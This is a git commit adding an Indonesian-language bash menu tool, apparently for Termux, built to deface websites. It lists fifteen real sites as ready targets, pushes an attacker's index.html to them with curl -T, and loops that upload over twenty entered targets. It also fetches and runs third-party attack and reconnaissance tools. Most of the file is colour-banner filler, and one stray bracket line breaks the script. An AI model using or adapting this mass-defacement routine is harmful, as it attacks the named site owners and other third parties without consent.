0bbfd53f2b1a38b8935406ddd7809caf0e047c3a
pennyw1s3 <50727921+pennyw1s3@users.noreply.github.com>
2019-06-07 18:56:45 +0700

    Add files via upload

---
+++ p3p3s.sh
@@ -0,0 +1,427 @@
+#!/bin/bash
+#Hayooo mau apa lu bangsd :v
+#Hanya orang buriq ke elu yg mau recide ini tool
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+pkg install toilet -y
+bash jr.sh
+echo
+echo  $green
+echo "Cieee yg nungguin....................................";
+sleep 0.4;
+clear
+echo  $red
+echo "Cieee yg nungguin....................................";
+sleep 0.4;
+clear
+echo  $yellow
+echo "Cieee yg nungguin....................................";
+sleep 0.4;
+clear
+echo  $indigo
+echo "Cieee yg nungguin....................................";
+sleep 0.4;
+echo  $purple
+echo "Cieee yg nungguin....................................";
+sleep 0.4;
+clear
+echo  $cyan
+echo "Cieee yg nungguin....................................";
+sleep 0.4;
+clear
+echo  $green
+echo "Cieee yg nungguin....................................";
+sleep 0.2;
+clear
+echo  $red
+echo "Cieee yg nungguin....................................";
+sleep 0.4;
+echo  $yellow
+echo "Cieee yg nungguin....................................";
+sleep 0.1;
+clear
+echo  $purple
+echo "Cieee yg nungguin....................................";
+sleep 0.2;
+clear
+echo  $indigo
+echo "Cieee yg nungguin....................................";
+sleep 0.4;
+clear
+echo  $cyan
+echo "Cieee yg nungguin....................................";
+sleep 0.3;
+echo  $green
+echo "Cieee yg nungguin....................................";
+sleep 0.5;
+clear
+echo  $red
+echo "Cieee yg nungguin....................................";
+sleep 0.5;
+clear
+echo  $yellow
+echo "Cieee yg nungguin....................................";
+sleep 0.5;
+clear
+echo  $indigo
+echo "Cieee yg nungguin....................................";
+sleep 0.5;
+clear
+echo  $purple
+echo "Cieee yg nungguin....................................";
+sleep 0.5;
+clear
+echo  $green
+echo "Cieee yg nungguin....................................";
+sleep 0.5;
+clear
+echo  $red
+echo "Cieee yg nungguin....................................";
+sleep 0.5;
+clear
+echo  $yellow
+echo "Cieee yg nungguin....................................";
+sleep 0.5;
+echo  $cyan
+echo "Cieee yg nungguin....................................";
+sleep 0.5;
+clear
+echo  $yellow
+echo "Cieee yg nungguin....................................";
+sleep 0.4;
+clear
+echo  $green
+echo "Cieee yg nungguin....................................";
+sleep 0.4;
+clear
+echo  $indigo
+echo "Cieee yg nungguin....................................";
+sleep 0.4;
+clear
+echo  $purple
+echo "Cieee yg nungguin....................................";
+sleep 0.4;
+echo  $green
+echo "Cieee yg nungguin....................................";
+sleep 0.4;
+clear
+echo
+echo
+echo
+echo
+echo
+echo
+echo
+toilet -f future "    .::Tebas Bacod::." | lolcat
+echo
+echo $red">>======================={$green" Haii Boejang "$red}=========================<<"
+echo $yellow
+figlet -f future "Tn. PENNYW1S3"
+echo
+echo $red">>================{$green" Skill Mu Hanya Ajang Bacod "$red}=======================<<"
+echo
+echo
+echo $indigo"	~"$cyan"{"$white"A"$cyan"}"$green"."$yellow"Tebas Bacod"$cyan
+echo $indigo"        ~"$cyan"{"$white"B"$cyan"}"$green"."$yellow"Diejoubu"$cyan
+echo $indigo"	~"$cyan"{"$white"C"$cyan"}"$green"."$yellow"Pepes 20 Web"$cyan
+echo $indigo"        ~"$cyan"{"$white"D"$cyan"}"$green"."$yellow"Red Hawk"$cyan
+echo
+echo
+echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo
+echo $indigo"  +"$cyan"{"$white"T"$cyan"}"$purple"."$green"Ini List 100 Web Vuln nya cuk"$indigo"      +"$cyan"{"$white"I"$cyan"}"$green"Info"$indigo"      +"$cyan"{"$white"Q"$cyan"}"$green"Quit"$cyan
+echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo $indigo"=============================================================="
+echo
+echo $white "╭─"$yellow"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ "  pws
+echo
+if [ $pws = "A" ] || [ $pws = "a" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo
+toilet -f future ".::Tebas Bacod::." | lolcat
+echo
+echo $red "Simpan SC Di Memory Internal Di Luar Folder Ya Say"
+echo
+echo $yellow "Target Langsung"
+echo $white "http://contsol.co.za"
+echo $cyan "http://colourfactory.co.za"
+echo $white "http://chillibitez.co.za"
+echo $cyan "http://chasingfantasia.com"
+echo $white "http://centraltech.co.za"
+echo $cyan "http://cblandscapes.co.za"
+echo $white "http://crimsonmonkeyweb.com"
+echo $cyan "http://kevinbutho.com"
+echo $white "http://prorepafrica.com"
+echo $cyan "http://xposurephotography.co.za"
+echo $white "http://windmillsandporcupines.co.za"
+echo $cyan "http://tcnig.co.za"
+echo $white "http://techdirect.co.za"
+echo $cyan "http://thehellenic.co.za"
+echo $white "http://valdicare.co.za"
+echo
+echo $red "Kentod Langsung!!!"
+echo $green "╭─"$blue"Tn.PENNYW1S3"$cyan" ~/Tn.PENNYW1S3"$white
+read -p " ╰─$ "  target
+echo
+echo $red "Masukin Scriptnya Boejang!!! "
+echo $green "╭─"$blue"Tn.PENNYW1S3"$cyan" ~/Nama SC Harus(index.html)"$white
+read -p " ╰─$ "  script
+curl -T /storage/emulated/0/$script $target
+echo $red "["$yellow"TeRkEnToD..."$red"]"$cyan"～～～＞"$green" $target"
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $pws = "B" ] || [ $pws = "b" ]
+then
+echo
+apt install php
+apt install git
+git clone https://github.com/justalinko/diejoubu.git
+cd diejoubu
+cd v1.2
+php daijobu.php
+echo
+echo
+echo
+echo
+echo
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $pws = "C" ] || [ $pws = "c" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo $red
+toilet -f future "Pepes 20 Web" | lolcat
+echo $cyan "Pepes Masal Sebanyak 20 Web"
+echo
+echo $red"###"$blue" ctrl + c to quit"$red" ###"
+echo
+echo
+echo
+echo "Masukin Sc lu Boejank !!!!"
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " script
+echo
+echo
+echo $white"Masukan Target1 !!!!"
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target1
+curl -T /storage/emulated/0/$script $target1
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target1/$script"
+echo
+echo $white"Masukan Target2 !!!!"
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target2
+curl -T /storage/emulated/0/$script $target2
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target2/$script"
+echo
+echo $white"Masukan Target3 !!!!"
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target3
+curl -T /storage/emulated/0/$script $target3
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target3/$script"
+echo
+echo $white"Masukan Target4 !!!!"
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target4
+curl -T /storage/emulated/0/$script $target4
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target4/$script"
+echo
+echo $white"Masukan Target5 !!!!"
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target5
+curl -T /storage/emulated/0/$script $target5
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target5/$script"
+echo
+echo $white"Masukan Target6 !!!!"
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target6
+curl -T /storage/emulated/0/$script $target6
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target6/$script"
+echo
+echo $white"Masukan Target7 !!!!"
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target7
+curl -T /storage/emulated/0/$script $target7
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target7/$script"
+echo
+echo $white"Masukan Target8 !!!!"
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target8
+curl -T /storage/emulated/0/$script $target8
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target8/$script"
+echo
+echo $white"Masukan Target9 !!!!"
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target9
+curl -T /storage/emulated/0/$script $target9
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target9/$script"
+echo
+echo $white"Masukan Target10 !!!! "
+echo $white "╭─"$green "Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target10
+curl -T /storage/emulated/0/$script $target10
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target10/$script"
+echo
+echo $white"Masukan Target11 !!!! "
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target11
+curl -T /storage/emulated/0/$script $target11
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target11/$script"
+echo
+echo $white"Masukan Target12 !!!! "
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target12
+curl -T /storage/emulated/0/$script $target12
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target12/$script"
+echo
+echo $white"Masukan Target13 !!!! "
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target13
+curl -T /storage/emulated/0/$script $target13
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target13/$script"
+echo
+echo $white"Masukan Target14 !!!! "
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target14
+curl -T /storage/emulated/0/$script $target14
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target14/$script"
+echo
+echo $white"Masukan Target15 !!!! "
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target15
+curl -T /storage/emulated/0/$script $target15
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target15/$script"
+echo
+echo $white"Masukan Target16 !!!! "
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target16
+curl -T /storage/emulated/0/$script $target16
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target16/$script"
+echo
+echo $white"Masukan Target17 !!!! "
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target17
+curl -T /storage/emulated/0/$script $target17
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target17/$script"
+echo
+echo $white"Masukan Target18 !!!! "
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target18
+curl -T /storage/emulated/0/$script $target18
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target18/$script"
+echo
+echo $white"Masukan Target19 !!!! "
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target19
+curl -T /storage/emulated/0/$script $target19
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target19/$script"
+echo
+echo $white"Masukan Target20 !!!! "
+echo $white "╭─"$green"Tn.PENNYW1S3"$cyan" ~/corazon"$white
+read -p " ╰─$ " target20
+curl -T /storage/emulated/0/$script $target20
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target20/$script"
+echo
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $pws = "D" ] || [ $pws = "d" ]
+then
+echo
+apt update && apt upgrade
+apt install git
+apt install php
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+cd RED_HAWK
+chmod +x *
+php rhawk.php
+echo
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back"$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+]
+if [ $pws = "I" ] || [ $pws = "i" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo
+toilet -f future "   Tentang Gw :v" | lolcat
+echo $red"##########################$green" WELCOME "$red###########################"
+echo $green"Author  : Tn.PENNYW1S3			"
+echo $purple"Github  : https://github.com/pennyw1s3/pepeswebdap"
+echo $white"Blog    : http://mukalukayaintegral.blogspot.com"
+echo
+echo $yellow"                          THANKS TO :"
+echo
+echo $cyan"[+] CORAZON "
+echo $cyan"[+] Cyber Wizard Squad "
+echo $cyan"[+] H4NZO, Deadpool, Rgs, ice bear, SOLID00, Mr.Ho4X, and Manteman Lucknut "
+echo $red"##########################$green" Haii Boejang "$red###########################"
+echo $indigo"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $pws = "T" ] || [ $pws = "t" ]
+then
+cat web.txt
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $pws = "Q" ] || [ $pws = "q" ]
+then
+echo "Dadah Boejang, Jan Rindu ea... Berad:)" |lolcat
+sleep 2
+figlet "Tn.PEnnyw1s3"  |lolcat
+sleep 4
+exit
+clear
+fi
+
+
+if [ $back = "B" ] || [ $back = "b" ]
+then
+sh p3p3s.sh
+fi
+
+if [ $back = "Q" ] || [ $back = "q" ]
+then
+clear
+fi
+
